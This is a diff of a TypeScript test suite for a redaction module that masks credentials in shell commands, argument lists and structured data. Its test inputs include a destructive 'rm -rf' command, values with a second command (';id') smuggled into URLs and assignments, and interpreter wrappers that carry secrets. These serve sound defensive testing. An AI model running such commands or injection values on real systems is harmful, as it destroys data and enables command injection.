-  it('treats each argument as its own field', () => {
+  it('treats an argument list as one field, withheld whole or with names replaced', () => {
     const next = random(0xa4c);
+    let shown = 0;
     for (let run = 0; run < 1000; run++) {
       const { pieces, hidden, withhold } = generate(next);
-      const out = redactArgv(pieces, NAMED);
-      expect(out).toHaveLength(pieces.length);
-      out.forEach((arg, i) => {
-        if (withhold[i]) expect(arg, pieces[i]).toBe(WITHHELD);
-        if (arg !== WITHHELD) expect(isPrecise(pieces[i]!, arg), pieces[i]).toBe(true);
-      });
-      for (const secret of hidden) expect(out.join(' '), pieces.join(' ')).not.toContain(secret);
+      // Half the lists start with a client whose credential flags are known.
+      const argv = next() < 0.5 ? ['curl', ...pieces] : pieces;
+      const out = redactArgv(argv, NAMED);
+      expect(out).toHaveLength(argv.length);
+      const line = JSON.stringify(argv);
+      if (withhold.some(Boolean) || out.includes(WITHHELD)) {
+        expect(out, line).toEqual(argv.map(() => WITHHELD));
+      } else {
+        shown++;
+        // argv[0] is never replaced; every argument keeps all but safe tokens.
+        if (argv[0] === 'curl') expect(out[0]).toBe('curl');
+        out.forEach((arg, i) => expect(isPrecise(argv[i]!, arg), argv[i]).toBe(true));
+      }
+      for (const secret of hidden) expect(out.join(' '), line).not.toContain(secret);
     }
+    expect(shown).toBeGreaterThan(50);
   });
 
   it('never replaces a word that could be a command, even one equal to the user or host name', () => {
@@ -1803,6 +1828,231 @@ describe('redaction never hides a command', () => {
         expect(field === WITHHELD || lines.some((line) => isPrecise(line!, field))).toBe(true);
       }
     }
+  });
+});
+
+describe('redaction, the four findings of the fourth review', () => {
+  const redact = (text: string) => redactField(text);
+  // Fake, built at run time so no scanner takes it for a real key.
+  const key = 'AKIA' + 'A'.repeat(16);
+  const password = 'password=' + 'h'.repeat(12);
+  const secrets = [key, password];
+
+  it('1: withholds a secret after a chain of leading redirections', () => {
+    for (const secret of secrets) {
+      for (const chain of [
+        '2>/dev/null >x <y',
+        '>a 2>b >>c <d',
+        '2>&1 &>log 3<in',
+        'A=1 2> x > y',
+      ]) {
+        expect(redact(`${chain} "${secret}"`), chain).toBe(WITHHELD);
+        expect(redact(`${chain} '${secret}' --flag`), chain).toBe(WITHHELD);
+        expect(redact(`true; ${chain} "${secret}"`), chain).toBe(WITHHELD);
+      }
+    }
+  });
+
+  it('2: withholds .netrc-shaped text whole, and the command after it', () => {
+    for (const secret of ['h'.repeat(12), key]) {
+      for (const text of [
+        `machine example.invalid login bob password ${secret}\nrm -rf /tmp/demo`,
+        `machine example.invalid login bob password ${secret} rm -rf /tmp/demo`,
+        `default login bob password ${secret}; rm -rf /tmp/demo`,
+        `machine x\n  login bob\n  password ${secret}\n  account y\nrm -rf /tmp/demo`,
+      ]) {
+        expect(redact(text), text).toBe(WITHHELD);
+      }
+    }
+  });
+
+  it('3: withholds a secret after a shell keyword', () => {
+    for (const secret of secrets) {
+      expect(redact(`if "${secret}"; then :; fi`)).toBe(WITHHELD);
+      expect(redact(`while "${secret}"; do :; done`)).toBe(WITHHELD);
+      expect(redact(`time "${secret}"`)).toBe(WITHHELD);
+      expect(redact(`! "${secret}"`)).toBe(WITHHELD);
+      expect(redact(`until '${secret}'; do :; done`)).toBe(WITHHELD);
+    }
+  });
+
+  it('4: withholds a quoted or glob-bracketed first word that holds a secret', () => {
+    for (const text of [
+      `"${password}" arg`,
+      `'${password}'`,
+      `"x ${password}" arg`,
+      `"${key}" arg`,
+      `[a]${key} arg`,
+      `[${key}] arg`,
+      `*${key}`,
+      `[p]assword=x ${password}`,
+    ]) {
+      expect(redact(text), text).toBe(WITHHELD);
+    }
+  });
+
+  it('withholds a secret in any shell string, wrapper or interpreter code', () => {
+    for (const text of [
+      `sh -c "curl -u bob:${'h'.repeat(8)} x"`,
+      `bash -c '${password}; id'`,
+      `python3 -c "import os; os.system('${key}')"`,
+      `node -e "${password}"`,
+      `perl -e 'print "${key}"'`,
+      `env ${password} cmd`,
+      `sudo ${password} cmd`,
+      `xargs ${key}`,
+      `nohup ${key} &`,
+      `timeout 5 ${key}`,
+      `echo ${key}`,
+      `x ${password}`,
+    ]) {
+      expect(redact(text), text).toBe(WITHHELD);
+    }
+  });
+
+  it('withholds an argument list a wrapper runs, or a secret anywhere but a credential value', () => {
+    const all = (argv: string[]) => argv.map(() => WITHHELD);
+    for (const argv of [
+      ['env', password, 'cmd'],
+      ['sudo', 'curl', '-u', 'bob:hunter2', 'https://example.invalid'],
+      ['xargs', key],
+      ['sh', '-c', `curl -u bob:hunter2 x`],
+      ['python3', '-c', `print("${key}")`],
+      ['nice', '-n', '5', key],
+      ['timeout', '5', 'mysql', '-phunter2'],
+      ['stdbuf', '-o0', password],
+      ['doas', 'docker', 'login', '-p', 'hunter2'],
+      // A known client with a secret outside a credential flag's value.
+      ['curl', '-d', password, 'https://example.invalid'],
+      ['curl', key],
+      ['git', 'clone', `https://example.invalid/${key}`],
+      // A git subcommand that isn't on the list, or global options before it.
+      ['git', '-c', 'x=y', 'clone', 'https://bob:hunter2@example.invalid/r'],
+      // A flag right after one that may take a value, for a tool that runs what it is given.
+      ['git', 'clone', '--upload-pack', 'https://bob:hunter2@example.invalid/r'],
+      ['mongosh', '--eval', '-p', 'hunter2'],
+      // argv[0] itself.
+      [key, '-u', 'bob:hunter2'],
+      [password],
+      [`/tmp/${key}/curl`, '-u', 'bob:hunter2'],
+    ]) {
+      expect(redactArgv(argv), JSON.stringify(argv)).toEqual(all(argv));
+    }
+    // A list of strings in structured data is read the same way.
+    expect(redactValue({ args: ['env', password, 'cmd'] }, {})).toEqual({
+      args: [WITHHELD, WITHHELD, WITHHELD],
+    });
+  });
+
+  it("cuts out a known client's credential flag value and URL password, never argv[0]", () => {
+    const cases: Array<[string[], string[]]> = [
+      [
+        ['curl', '-u', 'user:secret', 'https://example.invalid'],
+        ['curl', '-u', 'user:<redacted>', 'https://example.invalid'],
+      ],
+      [
+        ['curl', '-uuser:secret', 'x'],
+        ['curl', '-uuser:<redacted>', 'x'],
+      ],
+      [
+        ['curl', '--user=user:secret'],
+        ['curl', '--user=user:<redacted>'],
+      ],
+      [
+        ['curl', '-u', 'user'],
+        ['curl', '-u', 'user'],
+      ],
+      [
+        ['/usr/bin/curl', '-s', '-H', 'Authorization: Bearer abc123', 'https://example.invalid'],
+        [
+          '/usr/bin/curl',
+          '-s',
+          '-H',
+          'Authorization: Bearer <redacted>',
+          'https://example.invalid',
+        ],
+      ],
+      [
+        ['curl', 'https://bob:secret@example.invalid/x'],
+        ['curl', 'https://<credentials>@example.invalid/x'],
+      ],
+      [
+        ['wget', '--password=secret', 'https://example.invalid'],
+        ['wget', '--password=<redacted>', 'https://example.invalid'],
+      ],
+      [
+        ['git', 'clone', 'https://bob:secret@example.invalid/r.git'],
+        ['git', 'clone', 'https://<credentials>@example.invalid/r.git'],
+      ],
+      [
+        ['docker', 'login', '-u', 'bob', '--password', 'secret', 'registry.invalid'],
+        ['docker', 'login', '-u', 'bob', '--password', '<redacted>', 'registry.invalid'],
+      ],
+      [
+        ['podman', 'login', '-p', 'secret', 'registry.invalid'],
+        ['podman', 'login', '-p', '<redacted>', 'registry.invalid'],
+      ],
+      [
+        ['mysql', '-u', 'root', '-psecret', 'shop'],
+        ['mysql', '-u', 'root', '-p<redacted>', 'shop'],
+      ],
+      [
+        ['mysql', '--password=secret'],
+        ['mysql', '--password=<redacted>'],
+      ],
+      [
+        ['psql', 'postgresql://app:secret@db.invalid/x'],
+        ['psql', 'postgresql://<credentials>@db.invalid/x'],
+      ],
+      [
+        ['redis-cli', '-a', 'secret', '-u', 'redis://:secret@db.invalid'],
+        ['redis-cli', '-a', '<redacted>', '-u', 'redis://<credentials>@db.invalid'],
+      ],
+      [
+        ['mongosh', '-u', 'bob', '-p', 'secret', 'mongodb://db.invalid'],
+        ['mongosh', '-u', 'bob', '-p', '<redacted>', 'mongodb://db.invalid'],
+      ],
+      [
+        ['npm', 'install', 'https://bob:secret@example.invalid/p.tgz'],
+        ['npm', 'install', 'https://<credentials>@example.invalid/p.tgz'],
+      ],
+      [
+        ['openssl', 'enc', '-pass', 'pass:secret', '-in', 'a'],
+        ['openssl', 'enc', '-pass', 'pass:<redacted>', '-in', 'a'],
+      ],
+      [
+        ['openssl', 'enc', '-pass', 'env:VAR', '-in', 'a'],
+        ['openssl', 'enc', '-pass', 'env:VAR', '-in', 'a'],
+      ],
+    ];
+    for (const [argv, want] of cases) expect(redactArgv(argv), JSON.stringify(argv)).toEqual(want);
+    // A list of strings in structured data is read the same way.
+    expect(redactValue({ argv: ['curl', '-u', 'user:secret'] }, {})).toEqual({
+      argv: ['curl', '-u', 'user:<redacted>'],
+    });
+    // argv[0] is never replaced, even when it is the very value a flag would take.
+    expect(redactArgv(['user:secret'])).toEqual(['user:secret']);
+    expect(redactArgv([key, 'x'])).toEqual([WITHHELD, WITHHELD]);
+  });
+
+  it('still cuts out a secret where a field is one assignment, URL or JSON document', () => {
+    expect(redact(password)).toBe('password=<redacted>');
+    expect(redact(`AWS_ACCESS_KEY_ID=${key}`)).toBe('AWS_ACCESS_KEY_ID=<aws-key>');
+    expect(redact('https://bob:secret@example.invalid/x')).toBe(
+      'https://<credentials>@example.invalid/x',
+    );
+    expect(redact(`{"password":"secret","url":"https://bob:secret@example.invalid"}`)).toBe(
+      '{"password":"<redacted>","url":"https://<credentials>@example.invalid"}',
+    );
+    // A URL with a shell metacharacter, or an assignment with a command after it, is shell text.
+    expect(redact('https://bob:secret@example.invalid/x;id')).toBe(WITHHELD);
+    expect(redact('https://a;bob:secret@example.invalid/x')).toBe(WITHHELD);
+    expect(redact(`${password};id`)).toBe(WITHHELD);
+    expect(redact(`${password} id`)).toBe(WITHHELD);
+    // Under a credential key in structured data, as before.
+    expect(redactValue({ env: { GITHUB_TOKEN: 'abc', PATH: '/bin' } }, {})).toEqual({
+      env: { GITHUB_TOKEN: '<redacted>', PATH: '/bin' },
+    });
   });
 });
 
